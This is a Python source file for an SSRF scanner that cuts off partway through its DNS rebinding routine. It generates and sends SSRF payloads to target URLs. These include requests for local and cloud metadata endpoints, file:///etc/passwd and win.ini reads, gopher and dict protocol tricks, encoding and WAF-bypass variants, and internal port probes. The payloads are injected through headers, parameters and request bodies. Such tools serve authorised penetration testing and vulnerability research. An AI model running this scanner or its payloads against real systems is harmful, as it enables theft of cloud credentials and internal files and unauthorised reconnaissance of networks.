"""
SSRF-Scanner: A comprehensive and powerful tool for detecting Server-Side
Request Forgery vulnerabilities.
"""
# pylint: disable=too-many-lines,broad-except

# Copyright 2025 Ruslan Semchenko
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#     http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.

import argparse
import base64
import csv
import json
import logging
import os
import queue
import random
import socket
import sys
import threading
import time
from collections import deque
from dataclasses import dataclass
from datetime import datetime
from pathlib import Path
from threading import Thread, Lock
from typing import Any, Dict, List, Optional
from urllib.parse import quote

import colorama
import requests
import urllib3
from colorama import Fore
from requests.adapters import HTTPAdapter, Retry
from requests.exceptions import (ConnectionError as RequestsConnectionError,
                                 RequestException, Timeout)

colorama.init(autoreset=True)

__version__ = 'version 0.0.2'

def safe_header_value(value):
    """Filters values that cannot be encoded in latin-1 for HTTP headers."""
    try:
        value.encode('latin-1')
        return value
    except UnicodeEncodeError:
        return None


class Config:
    """Holds the configuration for the scanner."""
    def __init__(self):
        self.scanner = {
            'threads': 10,
            'timeout': 3,
            'retry_count': 2,
            'debug': False,
            'verify_ssl': False,
            'follow_redirects': True,
            'max_redirects': 3,
            'output_dir': "output",
            'user_agent': "SSRF-Scanner/1.0",
            'max_pool_size': 100,
            'capture_cookies': True
        }
        self.rate_limiting = {
            'requests_per_second': 10,
            'burst_size': 20,
            'min_rate': 0.5,
            'max_rate': 50
        }

    def get(self, key, default=None):
        """Gets a configuration value."""
        return self.scanner.get(key, default)


class ScanProgress:
    """Tracks the progress of the scan."""
    def __init__(self):
        self.phases = {
            'Local IP': 0,
            'Cloud Metadata': 0,
            'Protocol': 0,
            'Encoded': 0,
            'Parameter': 0,
            'Port Scan': 0,
            'DNS Rebinding': 0,
            'Remote': 0,
            'WAF Bypass': 0,
            'CRLF Injection': 0,
            'XXE': 0
        }
        self.current_phase = None
        self.total_phases = len(self.phases)
        self.phase_weight = {
            'Local IP': 0.25,
            'Cloud Metadata': 0.15,
            'Protocol': 0.15,
            'Encoded': 0.10,
            'Parameter': 0.10,
            'Port Scan': 0.10,
            'DNS Rebinding': 0.10,
            'Remote': 0.05,
            'WAF Bypass': 0.05,
            'CRLF Injection': 0.05,
            'XXE': 0.05
        }

    def update_phase(self, phase, progress):
        """Update the progress of a specific scan phase."""
        self.phases[phase] = progress
        self.current_phase = phase

    def get_total_progress(self):
        """Calculate the weighted total progress of the scan."""
        total = 0
        for phase, weight in self.phase_weight.items():
            total += self.phases[phase] * weight
        return total * 100


# pylint: disable=too-many-instance-attributes
@dataclass
class ScanResult:
    url: str
    attack_type: str
    payload: str
    response_code: int
    response_size: int
    timestamp: datetime
    headers: Dict[str, str]
    is_vulnerable: bool
    verification_method: str = ""
    notes: str = ""


class PayloadGenerator:
    """Generates various payload variations for SSRF testing."""
    def __init__(self):
        self.ip_formats = ['decimal', 'hex', 'octal']
        self.url_encodings = ['single', 'double', 'base64']
        self.protocol_variations = ['standard', 'nested', 'mixed']

    def generate_ip_variations(self, ip):
        """Generates different IP address format variations."""
        # pylint: disable=too-many-branches,too-many-statements
        variations = set()
        try:
            variations.add(ip)
            if ip in ['localhost', 'internal', 'intranet']:
                variations.add('127.0.0.1')
                return list(variations)
            if ':' in ip:
                variations.add(ip)
                variations.add(ip.strip('[]'))
                variations.add(f'[{ip}]')
                return list(variations)
            if any(c.isalpha() for c in ip):
                variations.add(ip)
                return list(variations)
            if '.' in ip:
                try:
                    parts = ip.split('.')
                    if len(parts) == 4:
                        variations.add(ip)
                        try:
                            ipint = int.from_bytes(socket.inet_aton(ip), 'big')
                            variations.add(str(ipint))
                        except (TypeError, socket.error):
                            pass
                        try:
                            hex_parts = [hex(int(part))[2:] for part in parts]
                            variations.add('.'.join(f"0x{part}" for part in hex_parts))
                        except ValueError:
                            pass
                        try:
                            oct_parts = [oct(int(part))[2:] for part in parts]
                            variations.add('.'.join(f"0{part}" for part in oct_parts))
                        except ValueError:
                            pass
                        try:
                            variations.add(
                                f"{parts[0]}.{int(parts[1])}."
                                f"{hex(int(parts[2]))[2:]}.{oct(int(parts[3]))[2:]}"
                            )
                        except ValueError:
                            pass
                except Exception as e:
                    logging.debug("Error processing IPv4 address %s: %s", ip, e)
            elif ip.startswith('0x'):
                try:
                    dec = int(ip[2:], 16)
                    ip_bytes = dec.to_bytes(4, 'big')
                    variations.add('.'.join(str(b) for b in ip_bytes))
                except (ValueError, TypeError, OverflowError):
                    variations.add(ip)
            elif ip.startswith('0'):
                try:
                    dec = int(ip, 8)
                    ip_bytes = dec.to_bytes(4, 'big')
                    variations.add('.'.join(str(b) for b in ip_bytes))
                except (ValueError, TypeError, OverflowError):
                    variations.add(ip)
            current_variations = variations.copy()
            for var in current_variations:
                variations.add(quote(var))
                variations.add(quote(quote(var)))
        except Exception as e:
            logging.debug("Error generating variations for %s: %s", ip, e)
            variations.add(ip)
        return list(variations)

    def generate_url_encodings(self, url):
        """Generates various URL encoding variations."""
        variations = set()
        try:
            variations.add(url)
            variations.add(quote(url))
            variations.add(quote(quote(url)))
            variations.add(base64.b64encode(url.encode()).decode())
            # Исключаем варианты, которые не кодируются в latin-1
            # Exclude variants that are not encoded in latin-1 and add more
            for var in [url.replace('.', '%2e'), url.replace('/', '%2f'),
                        url.replace('.', '。'), url.replace('//', '／／')]:
                if safe_header_value(var):
                    variations.add(var)
        except Exception as e:
            logging.debug("Error generating URL encodings for %s: %s", url, e)
            variations.add(url)
        return list(variations)

    def generate_protocol_variations(self, protocol, payload):
        """Generates variations for a given protocol and payload."""
        variations = set()
        try:
            variations.add(f"{protocol}://{payload}")
            variations.add(f"{protocol}:/{payload}")
            variations.add(f"{protocol}:///{payload}")
            variations.add(f"{protocol}://{protocol}://{payload}")
            variations.add(f"{protocol.upper()}://{payload}")
            variations.add(f"{protocol.title()}://{payload}")
            variations.add(f"{quote(protocol)}://{payload}")
        except Exception as e:
            logging.error("Error generating protocol variations for %s: %s", protocol, e)
        return list(variations)


class ProtocolHandler:
    """Handles generation of payloads for specific protocols."""
    def __init__(self):
        self.generator = PayloadGenerator()

    def handle_gopher(self, payload):
        """Generate gopher-specific payloads."""
        variations = []
        try:
            variations.append(f"gopher://{payload}")
            variations.append(f"gopher://{payload}:70")
            variations.append(f"gopher://{payload}/1")
            for var in self.generator.generate_url_encodings(f"gopher://{payload}"):
                if safe_header_value(var):
                    variations.append(var)
        except Exception as e:
            logging.error("Error handling gopher protocol: %s", e)
        return variations

    def handle_dict(self, payload):
        """Generate dict-specific payloads."""
        variations = []
        try:
            variations.append(f"dict://{payload}")
            variations.append(f"dict://{payload}/d:password")
            variations.append(f"dict://{payload}/show:db")
            variations.append(f"dict://dict:dict@{payload}")
        except Exception as e:
            logging.error("Error handling dict protocol: %s", e)
        return variations

    def handle_file(self, payload):
        """Generate file-specific payloads."""
        variations = []
        try:
            variations.append(f"file://{payload}")
            variations.append(f"file:///{payload}")
            variations.append("file:///etc/passwd")
            variations.append("file:///windows/win.ini")
            variations.append(f"file://../{payload}")
            variations.append(f"file:///./{payload}")
        except Exception as e:
            logging.error("Error handling file protocol: %s", e)
        return variations

    def generate_protocol_variations(self, protocol, payload):
        """Generate protocol variations using the payload generator."""
        return self.generator.generate_protocol_variations(protocol, payload)


class Reporter:
    """Handles reporting of scan results to various formats."""
    def __init__(self, output_dir: str):
        self.output_dir = Path(output_dir)
        self.output_dir.mkdir(parents=True, exist_ok=True)
        self.results: List[ScanResult] = []
        self.txt_output = self.output_dir / 'report.txt'
        self.json_output = self.output_dir / 'report.json'
        self.csv_output = self.output_dir / 'report.csv'

    def add_result(self, result: ScanResult):
        """Adds a scan result and writes it to output files if vulnerable."""
        self.results.append(result)
        if result.is_vulnerable:
            self._write_result(result)

    def _write_result(self, result: ScanResult):
        """Writes a single result to all configured output files."""
        with open(self.txt_output, 'a', encoding='utf-8') as f:
            f.write("\nPotential SSRF Found!\n")
            f.write(f"URL: {result.url}\n")
            f.write(f"Attack Type: {result.attack_type}\n")
            f.write(f"Payload: {result.payload}\n")
            f.write(f"Response Code: {result.response_code}\n")
            f.write(f"Response Size: {result.response_size}\n")
            f.write(f"Verification Method: {result.verification_method}\n")
            f.write(f"Notes: {result.notes}\n")
            f.write("-" * 50 + "\n")
        with open(self.csv_output, 'a', newline='', encoding='utf-8') as f:
            writer = csv.writer(f)
            if f.tell() == 0:
                writer.writerow([
                    'URL', 'Attack Type', 'Payload', 'Response Code',
                    'Response Size', 'Verification Method', 'Timestamp', 'Notes'
                ])
            writer.writerow([
                result.url, result.attack_type, result.payload,
                result.response_code, result.response_size,
                result.verification_method, result.timestamp, result.notes
            ])
        results_json = []
        if self.json_output.exists():
            with open(self.json_output, 'r', encoding='utf-8') as f:
                try:
                    results_json = json.load(f)
                except json.JSONDecodeError:
                    results_json = []
        results_json.append({
            'url': result.url,
            'attack_type': result.attack_type,
            'payload': result.payload,
            'response_code': result.response_code,
            'response_size': result.response_size,
            'verification_method': result.verification_method,
            'timestamp': result.timestamp.isoformat(),
            'notes': result.notes
        })
        with open(self.json_output, 'w', encoding='utf-8') as f:
            json.dump(results_json, f, indent=2)

    def generate_summary(self, urls_analyzed: int, error_urls: int) -> str:
        """Generates a final summary report of the scan."""
        stats = self._calculate_statistics(urls_analyzed, error_urls)
        summary = "\n" + "="*50 + "\n"
        summary += "SSRF Scan Summary\n"
        summary += "="*50 + "\n\n"
        summary += "Statistics:\n"
        summary += "-"*20 + "\n"
        for key, value in stats.items():
            summary += f"{key:25}: {value}\n"
        summary += "\nVulnerabilities by Attack Type:\n"
        summary += "-"*30 + "\n"
        grouped = self._group_vulnerabilities()
        for attack_type, results in grouped.items():
            summary += f"{attack_type}: {len(results)} found\n"
        summary += "\n" + "="*50 + "\n"
        summary += "Detailed results saved in:\n"
        summary += f"  Text Report: {self.txt_output.resolve()}\n"
        summary += f"  CSV Report:  {self.csv_output.resolve()}\n"
        summary += f"  JSON Report: {self.json_output.resolve()}\n"
        with open(self.output_dir / 'summary.txt', 'w', encoding='utf-8') as f:
            f.write(summary)
        return summary

    def _calculate_statistics(self, urls_analyzed: int, error_urls: int) -> Dict[str, Any]:
        """Calculates various statistics about the scan results."""
        total_vulnerabilities = len([r for r in self.results if r.is_vulnerable])
        unique_vuln_types = len(set(r.attack_type for r in self.results if r.is_vulnerable))
        return {
            'URLs Processed': urls_analyzed,
            'Total Requests Made': len(self.results),
            'URL Errors': error_urls,
            'Vulnerabilities Found': total_vulnerabilities,
            'Vulnerability Rate':
                f"{(total_vulnerabilities / len(self.results)) * 100:.2f}%" if self.results else "0%",
            'Unique Vulnerability Types': unique_vuln_types
        }

    def _group_vulnerabilities(self) -> Dict[str, List[ScanResult]]:
        """Groups vulnerabilities by attack type."""
        grouped = {}
        for result in self.results:
            if result.is_vulnerable:
                if result.attack_type not in grouped:
                    grouped[result.attack_type] = []
                grouped[result.attack_type].append(result)
        return grouped


class RateLimiter:
    """A token-bucket rate limiter with adaptive rate adjustment."""
    def __init__(self, requests_per_second: float, burst_size: int = 10):
        self.rate = requests_per_second
        self.burst_size = burst_size
        self.tokens = burst_size
        self.last_update = time.time()
        self.lock = threading.Lock()
        self.request_history = deque(maxlen=1000)
        self.error_count = 0
        self.success_count = 0
        self.adaptive_rate = requests_per_second
        self.min_rate = 0.5
        self.max_rate = requests_per_second * 2

    def wait(self) -> bool:
        """Blocks until a request can be made, respecting the rate limit."""
        with self.lock:
            now = time.time()
            time_passed = now - self.last_update
            self.tokens = min(
                self.burst_size,
                self.tokens + time_passed * self.rate
            )
            if self.tokens >= 1:
                self.tokens -= 1
                self.last_update = now
                self.request_history.append(now)
                return True
            wait_time = (1 - self.tokens) / self.rate
            time.sleep(wait_time)
            self.tokens -= 1
            self.last_update = time.time()
            self.request_history.append(self.last_update)
            return True

    def adjust_rate(self, success: bool):
        """Adjusts the request rate based on the success of recent requests."""
        with self.lock:
            if success:
                self.success_count += 1
                self.error_count = max(0, self.error_count - 1)
                if self.success_count > 10:
                    self.adaptive_rate = min(
                        self.max_rate,
                        self.adaptive_rate * 1.1
                    )
                    self.success_count = 0
            else:
                self.error_count += 1
                self.success_count = 0
                if self.error_count > 3:
                    self.adaptive_rate = max(
                        self.min_rate,
                        self.adaptive_rate * 0.5
                    )
                    self.error_count = 0
            self.rate = self.adaptive_rate


class SmartThrottler:
    """A throttler that combines rate limiting with exponential backoff."""
    def __init__(self):
        self.rate_limiter = RateLimiter(requests_per_second=10)
        self.backoff_time = 1.0
        self.max_backoff = 30.0
        self.success_threshold = 5
        self.consecutive_successes = 0
        self.consecutive_failures = 0
        self.lock = threading.Lock()

    def pre_request(self):
        """Called before a request is made to wait if necessary."""
        self.rate_limiter.wait()

    def post_request(self, success: bool):
        """Called after a request is made to adjust throttling."""
        with self.lock:
            if success:
                self.consecutive_successes += 1
                self.consecutive_failures = 0
                self._decrease_backoff()
            else:
                self.consecutive_failures += 1
                self.consecutive_successes = 0
                self._increase_backoff()
            self.rate_limiter.adjust_rate(success)

    def _increase_backoff(self):
        """Increases the backoff time on failure."""
        self.backoff_time = min(
            self.max_backoff,
            self.backoff_time * 2
        )
        time.sleep(self.backoff_time)

    def _decrease_backoff(self):
        """Decreases the backoff time on success."""
        if self.consecutive_successes >= self.success_threshold:
            self.backoff_time = max(
                1.0,
                self.backoff_time * 0.5
            )


class ErrorHandler:
    """Handles errors during requests, with logic for retries and WAF detection."""
    def __init__(self):
        self.throttler = SmartThrottler()
        self.max_retries = 3
        self.timeout_multiplier = 1.5
        self.current_timeout = 10
        self.error_counts: Dict[str, int] = {}
        self.waf_signatures = [
            'blocked',
            'forbidden',
            'waf',
            'security',
            'cloudflare',
            'protection'
        ]

    def handle_error(self, url: str, error: Exception, response: Optional[requests.Response] = None) -> bool:
        error_type = type(error).__name__
        """Handles a request error, returns True if a retry should be attempted."""
        self.error_counts[error_type] = self.error_counts.get(error_type, 0) + 1
        if isinstance(error, Timeout):
            return self.handle_timeout()
        if isinstance(error, RequestsConnectionError):
            return self.handle_connection_error(url)
        elif isinstance(error, RequestException):
            if response and self._detect_waf(response):
                return self.handle_waf(url)
            return self.handle_general_error(error)
        return False

    def handle_timeout(self) -> bool:
        """Handles a timeout error."""
        self.current_timeout *= self.timeout_multiplier
        self.throttler.post_request(success=False)
        return True

    def handle_connection_error(self, url: str) -> bool:
        """Handles a connection error."""
        logging.warning("Connection error for %s. Retrying...", url)
        time.sleep(random.uniform(1, 3))
        self.throttler.post_request(success=False)
        return True

    def handle_waf(self, url: str) -> bool:
        """Handles WAF detection."""
        logging.warning("WAF detected for %s. Adjusting strategy...", url)
        self.throttler.backoff_time *= 2
        time.sleep(random.uniform(5, 10))
        return True

    def handle_general_error(self, error) -> bool:
        """Handles a general request exception."""
        should_retry = self.error_counts.get(type(error).__name__, 0) < self.max_retries
        if should_retry:
            time.sleep(random.uniform(0.5, 1.5))
        return should_retry

    def _detect_waf(self, response: requests.Response) -> bool:
        """Detects the presence of a WAF from the response."""
        if response.status_code in [403, 406, 429, 456]:
            return True
        response_text = response.text.lower()
        response_headers = str(response.headers).lower()
        for signature in self.waf_signatures:
            if signature in response_text or signature in response_headers:
                return True
        return False

    def reset_error_counts(self):
        """Resets error counters after a successful request."""
        self.error_counts.clear()
        self.current_timeout = 10


class SSRFScanner:
    """The main SSRF scanner class."""
    def __init__(self, config: Config):
        print_banner()
        self.config = config
        self.session = self._create_session()
        self.error_handler = ErrorHandler()
        self.throttler = SmartThrottler()
        self.payload_generator = PayloadGenerator()
        self.protocol_handler = ProtocolHandler()
        self.q = queue.Queue()
        self.lock = Lock()
        self.local_ips = []
        self.headers = []
        self.cloud_metadata = []
        self.protocols = []
        self.encoded_payloads = []
        self.parameter_payloads = []
        self.port_payloads = []
        self.dns_rebinding = []
        self.waf_bypass_payloads = []
        self.crlf_payloads = []
        self.xxe_payloads = []
        self.total_urls_to_scan = 0
        self.urls_analyzed = 0
        self.error_urls = 0
        self.backurl = ""
        self.cookies = None
        self.progress = ScanProgress()
        self.output_filename = datetime.now().strftime("%Y_%m_%d-%I_%M_%S_%p")
        self.output_dir = Path(self.config.scanner['output_dir']) / self.output_filename
        self.setup_output_files()
        self.reporter = Reporter(str(self.output_dir))
        self.setup_logging()
        self.methods_to_test = ['GET', 'POST', 'HEAD', 'PUT', 'PATCH']
        self.load_all_payloads()

    def _create_session(self):
        """Creates and configures a requests.Session object."""
        session = requests.Session()
        retry_strategy = Retry(
            total=self.config.scanner['retry_count'],
            backoff_factor=0.5,
            status_forcelist=[500, 502, 503, 504]
        )
        adapter = HTTPAdapter(
            max_retries=retry_strategy,
            pool_connections=self.config.scanner['max_pool_size'],
            pool_maxsize=self.config.scanner['max_pool_size']
        )
        session.mount("http://", adapter)
        session.mount("https://", adapter)
        return session

    def setup_logging(self):
        """Configures logging for the application."""
        logging.basicConfig(
            level=logging.INFO if not self.config.scanner['debug'] else logging.DEBUG,
            format='%(asctime)s - %(levelname)s - %(message)s'
        )
        self.logger = logging.getLogger('ssrf_scanner')
        urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

    def setup_output_files(self):
        """Creates the output directory for reports."""
        self.output_dir.mkdir(parents=True, exist_ok=True)

    def load_all_payloads(self):
        """Loads all payloads from the 'payloads' directory."""
        payload_dir = Path(__file__).parent / "payloads"
        if not os.path.exists(payload_dir):
            os.makedirs(payload_dir)
            self.logger.warning("Created %s directory", payload_dir)
        payload_files = {
            'local_ips.txt': self.local_ips,
            'headers.txt': self.headers,
            'cloud_metadata.txt': self.cloud_metadata,
            'protocols.txt': self.protocols,
            'encoded_payloads.txt': self.encoded_payloads,
            'parameter_payloads.txt': self.parameter_payloads,
            'port_payloads.txt': self.port_payloads,
            'dns_rebinding.txt': self.dns_rebinding,
            'waf_bypass.txt': self.waf_bypass_payloads,
            'crlf_ssrf.txt': self.crlf_payloads,
            'xxe_ssrf.txt': self.xxe_payloads
        }
        for filename, payload_list in payload_files.items():
            filepath = payload_dir / filename
            try:
                if not os.path.exists(filepath):
                    with open(filepath, 'w', encoding='utf-8') as f:
                        f.write("# Add your payloads here\n")
                    self.logger.warning("Created empty payload file: %s", filename)
                else:
                    with open(filepath, 'r', encoding='utf-8') as f:
                        payload_list.extend([line.strip() for line in f if line.strip() and not line.startswith('#')])
                    self.logger.info("Loaded %d payloads from %s", len(payload_list), filename)
            except (IOError, OSError) as e:
                self.logger.error("Error processing %s: %s", filename, e)

    def make_request(self, url: str, method: str = 'GET',
                     headers: Optional[Dict[str, str]] = None, **kwargs) -> Optional[requests.Response]:
        """Makes an HTTP request with configured retries, timeout, and throttling."""
        retries = 0
        max_retries = self.config.get('retry_count', 3)

        # pylint: disable=line-too-long
        request_headers = {'User-Agent': self.config.get('user_agent'), 'Accept': '*/*'}
        if self.cookies:
            if isinstance(self.cookies, str):
                request_headers['Cookie'] = self.cookies
            elif isinstance(self.cookies, dict):
                request_headers['Cookie'] = '; '.join([f'{k}={v}' for k, v in self.cookies.items()])
        
        if headers:
            for k, v in headers.items():
                safe_v = safe_header_value(v)
                if safe_v is not None:
                    request_headers[k] = safe_v
                elif self.config.get('debug'):
                    self.logger.debug("Skipped header %s: %s (non-latin-1)", k, v)

        while retries < max_retries:
            try:
                self.throttler.pre_request()
                response = self.session.request(
                    method=method,
                    url=url,
                    headers=request_headers,
                    timeout=self.error_handler.current_timeout,
                    verify=self.config.get('verify_ssl'),
                    allow_redirects=self.config.get('follow_redirects'),
                    **kwargs
                )
                self.throttler.post_request(success=True)
                self.error_handler.reset_error_counts()
                if self.config.get('capture_cookies') and 'Set-Cookie' in response.headers and not self.cookies:
                    self.cookies = response.headers['Set-Cookie']
                return response
            except Exception as e:
                retries += 1
                should_retry = self.error_handler.handle_error(url, e, locals().get('response'))
                if not should_retry or retries >= max_retries:
                    self.logger.error("Max retries reached for %s: %s", url, e)
                    return None
        return None

    def analyze_response(self, original_response, test_response):
        """Compares two responses to find differences indicating a vulnerability."""
        if not test_response:
            return False, {}
        differences = {
            'status_code': original_response.status_code != test_response.status_code,
            'content_length': len(original_response.content) != len(test_response.content),
            'content_type': original_response.headers.get('content-type') != test_response.headers.get('content-type'),
            'word_count': len(original_response.text.split()) != len(test_response.text.split()),
            'response_time': abs(test_response.elapsed.total_seconds() - original_response.elapsed.total_seconds()) > 2
        }
        return any(differences.values()), differences

    def print_progress(self):
        """Prints the current scan progress to the console."""
        with self.lock:
            total_progress = self.progress.get_total_progress()
            current_phase = self.progress.current_phase or "Initializing"
            print('\r' + ' ' * 100 + '\r', end='')
            print(f"URLs: {self.urls_analyzed}/{self.total_urls_to_scan} | "
                  f"Errors: {self.error_urls} | "
                  f"Phase: {current_phase} | "
                  f"Overall Progress: {total_progress:.1f}%", end='\r')

    def update_progress(self, phase, completed, total):
        """Updates the progress for a specific attack phase."""
        progress = (completed / total * 100) if total > 0 else 100
        self.progress.update_phase(phase, progress/100)
        self.print_progress()

    def perform_attack(self, url: str, attack_type: str, payload: str,
                       headers: Dict[str, str], original_response: requests.Response,
                       method: str = 'GET', data: Optional[Any] = None,
                       json_data: Optional[Dict[str, str]] = None) -> Optional[ScanResult]:
        """Performs a single attack test and reports the result."""
        try:
            response = self.make_request(url, method=method, headers=headers, data=data, json=json_data)
            if not response:
                return None
            is_vulnerable, differences = self.analyze_response(original_response, response)
            result = ScanResult(
                url=url,
                attack_type=attack_type,
                payload=payload,
                response_code=response.status_code,
                response_size=len(response.content),
                timestamp=datetime.now(),
                headers=headers,
                is_vulnerable=is_vulnerable,
                notes=str(differences) if differences else ""
            )
            if is_vulnerable:
                result.verification_method = self.verify_vulnerability(url, payload, response)
                self.log_vulnerability(result)
            self.reporter.add_result(result)
            return result
        except Exception as e:
            self.logger.error("Error performing %s attack on %s: %s", attack_type, url, e)
            return None

    def local_attack(self, url, original_response):
        """Tests for SSRF using local IP addresses and variations."""
        total_tests = len(self.headers) * len(self.local_ips) * len(self.methods_to_test)
        completed_tests = 0
        for header in self.headers:
            for ip in self.local_ips:
                variations = self.payload_generator.generate_ip_variations(ip)
                for payload in variations:
                    for method in self.methods_to_test:
                        completed_tests += 1
                        self.update_progress('Local IP', completed_tests, total_tests)
                        header_value = safe_header_value(payload)
                        if header_value is None:
                            continue
                        bad_header = {header: header_value}
                        data_payload = {f"ssrf_payload_{random.randint(1, 100)}": payload} \
                            if method in ['POST', 'PUT', 'PATCH'] else None
                        result = self.perform_attack(
                            url, f'Local IP ({method})', payload, bad_header,
                            original_response, method=method, data=data_payload)
                        if result and result.is_vulnerable:
                            self.log_vulnerability(result)

    def cloud_metadata_attack(self, url, original_response):
        """Tests for SSRF by attempting to access cloud metadata endpoints."""
        total_tests = len(self.headers) * len(self.cloud_metadata) * len(self.methods_to_test)
        completed_tests = 0
        for header in self.headers:
            for metadata_url in self.cloud_metadata:
                variations = self.payload_generator.generate_url_encodings(metadata_url)
                for payload in variations:
                    for method in self.methods_to_test:
                        completed_tests += 1
                        self.update_progress('Cloud Metadata', completed_tests, total_tests)
                        header_value = safe_header_value(payload)
                        if header_value is None:
                            continue
                        bad_header = {header: header_value}
                        data_payload = {f"ssrf_payload_{random.randint(1, 100)}": payload} \
                            if method in ['POST', 'PUT', 'PATCH'] else None
                        result = self.perform_attack(
                            url, f'Cloud Metadata ({method})', payload, bad_header,
                            original_response, method=method, data=data_payload)
                        if result and result.is_vulnerable:
                            self.log_vulnerability(result)

    def protocol_attack(self, url, original_response):
        """Tests for SSRF using various protocol handlers (file, gopher, etc.)."""
        total_tests = len(self.headers) * len(self.protocols) * min(len(self.local_ips), 5) * len(self.methods_to_test)
        completed_tests = 0
        for header in self.headers:
            for protocol in self.protocols:
                for ip in self.local_ips[:5]:
                    for method in self.methods_to_test:
                        completed_tests += 1
                        self.update_progress('Protocol', completed_tests, total_tests)
                        if protocol == 'gopher':
                            payloads = self.protocol_handler.handle_gopher(ip)
                        elif protocol == 'dict':
                            payloads = self.protocol_handler.handle_dict(ip)
                        elif protocol == 'file':
                            payloads = self.protocol_handler.handle_file(ip)
                        else:
                            payloads = self.protocol_handler.generate_protocol_variations(protocol, ip)
                        for payload in payloads:
                            header_value = safe_header_value(payload)
                            if header_value is None:
                                continue
                            bad_header = {header: header_value}
                            data_payload = {f"ssrf_payload_{random.randint(1, 100)}": payload} \
                                if method in ['POST', 'PUT', 'PATCH'] else None
                            result = self.perform_attack(
                                url, f'Protocol ({method})', payload, bad_header,
                                original_response, method=method, data=data_payload)
                            if result and result.is_vulnerable:
                                self.log_vulnerability(result)

    def encoded_attack(self, url, original_response):
        """Tests for SSRF using various encoding techniques to bypass filters."""
        total_tests = len(self.headers) * len(self.encoded_payloads) * len(self.methods_to_test)
        completed_tests = 0
        for header in self.headers:
            for base_payload in self.encoded_payloads:
                for method in self.methods_to_test:
                    completed_tests += 1
                    self.update_progress('Encoded', completed_tests, total_tests)
                    encoded_variations = [
                        base_payload,
                        quote(base_payload),
                        quote(quote(base_payload)),
                        base64.b64encode(base_payload.encode()).decode(),
                    ]
                    for payload in encoded_variations:
                        header_value = safe_header_value(payload)
                        if header_value is None:
                            continue
                        bad_header = {header: header_value}
                        data_payload = {f"ssrf_payload_{random.randint(1, 100)}": payload} \
                            if method in ['POST', 'PUT', 'PATCH'] else None
                        result = self.perform_attack(
                            url, f'Encoded ({method})', payload, bad_header,
                            original_response, method=method, data=data_payload)
                        if result and result.is_vulnerable:
                            self.log_vulnerability(result)

    def parameter_attack(self, url, original_response):
        """Tests for SSRF by injecting payloads into URL parameters."""
        ssrf_payloads = self.local_ips[:5] + self.cloud_metadata[:2]
        if self.backurl:
            ssrf_payloads.append(self.backurl)
        
        params_to_test = [p.split('=')[0].strip('?') for p in self.parameter_payloads]

        post_put_patch_methods = [
            m for m in self.methods_to_test if m in ['POST', 'PUT', 'PATCH']
        ]
        other_methods = [m for m in self.methods_to_test if m not in post_put_patch_methods]
        total_tests = len(params_to_test) * len(ssrf_payloads) * (
            len(other_methods) + len(post_put_patch_methods) * 2
        )
        completed_tests = 0
        def check_and_log(response, method, payload_str, test_url_for_log):
            """Helper to check response and log if vulnerable."""
            if not response:
                return
            is_vulnerable, differences = self.analyze_response(original_response, response)
            if is_vulnerable:
                result = ScanResult(
                    url=url,
                    attack_type=f'Parameter ({method})',
                    payload=payload_str,
                    response_code=response.status_code,
                    response_size=len(response.content),
                    timestamp=datetime.now(),
                    headers={},
                    is_vulnerable=True,
                    notes=str(differences)
                )
                result.verification_method = self.verify_vulnerability(
                    test_url_for_log, ssrf_payload, response)
                self.reporter.add_result(result)
                self.log_vulnerability(result)

        for param_name in params_to_test:
            for ssrf_payload in ssrf_payloads:
                for method in self.methods_to_test:
                    if method == 'GET':
                        completed_tests += 1
                        self.update_progress('Parameter', completed_tests, total_tests)
                        encoded_ssrf_payload = quote(ssrf_payload)
                        param_part = f"{param_name}={encoded_ssrf_payload}"
                        test_url = f"{url}{'&' if '?' in url else '?'}{param_part}"
                        response = self.make_request(test_url, method='GET')
                        check_and_log(response, 'GET', param_part, test_url)
                    elif method in ['POST', 'PUT', 'PATCH']:
                        # Test as form data
                        completed_tests += 1
                        self.update_progress('Parameter', completed_tests, total_tests)
                        data = {param_name: ssrf_payload}
                        payload_str = f"Form: {data}"
                        response_form = self.make_request(url, method=method, data=data)
                        check_and_log(response_form, f'{method}-FORM', payload_str, url)

                        # Test as JSON
                        completed_tests += 1
                        self.update_progress('Parameter', completed_tests, total_tests)
                        json_data = {param_name: ssrf_payload}
                        payload_str = f"JSON: {json.dumps(json_data)}"
                        headers = {'Content-Type': 'application/json'}
                        response_json = self.make_request(
                            url, method=method, json=json_data, headers=headers)
                        check_and_log(response_json, f'{method}-JSON', payload_str, url)
                    else:  # HEAD
                        completed_tests += 1
                        self.update_progress('Parameter', completed_tests, total_tests)
                        encoded_ssrf_payload = quote(ssrf_payload)
                        param_part = f"{param_name}={encoded_ssrf_payload}"
                        test_url = f"{url}{'&' if '?' in url else '?'}{param_part}"
                        response = self.make_request(test_url, method=method)
                        check_and_log(response, method, param_part, test_url)

    def port_scan_attack(self, url, original_response):
        """Attempts to discover open ports on internal services."""
        total_tests = (len(self.headers) * len(self.port_payloads) *
                       len(self.local_ips[:5]) * len(self.methods_to_test))
        completed_tests = 0
        for header in self.headers:
            for port in self.port_payloads:
                for ip in self.local_ips[:5]:
                    for method in self.methods_to_test:
                        completed_tests += 1
                        self.update_progress('Port Scan', completed_tests, total_tests)
                        payload = f"{ip}{port}"
                        header_value = safe_header_value(payload)
                        if header_value is None:
                            continue
                        bad_header = {header: header_value}
                        data_payload = {f"ssrf_payload_{random.randint(1, 100)}": payload} \
                            if method in ['POST', 'PUT', 'PATCH'] else None
                        result = self.perform_attack(
                            url, f'Port Scan ({method})', payload, bad_header,
                            original_response, method=method, data=data_payload)
                        if result and result.is_vulnerable:
                            self.log_vulnerability(result)

    def dns_rebinding_attack(self, url, original_response):
        """Tests for DNS rebinding vulnerabilities."""
        total_tests = len(self.headers) * len(self.dns_rebinding) * len(self.methods_to_test)
        completed_tests = 0
        for header in self.headers:
            for dns in self.dns_rebinding:
                for method in self.methods_to_test:
                    completed_tests += 1
                    self.update_progress('DNS Rebinding', completed_tests, total_tests)
                    payload = dns
                    if '<BURP-COLLABORATOR>' in payload and self.backurl:
                        payload = payload.replace('<BURP-COLLABORATOR>', self.backurl)
                    header_value = safe_header_value(payload)
                    if header_value is None:
                        continue
                    bad_header = {header: header_value}
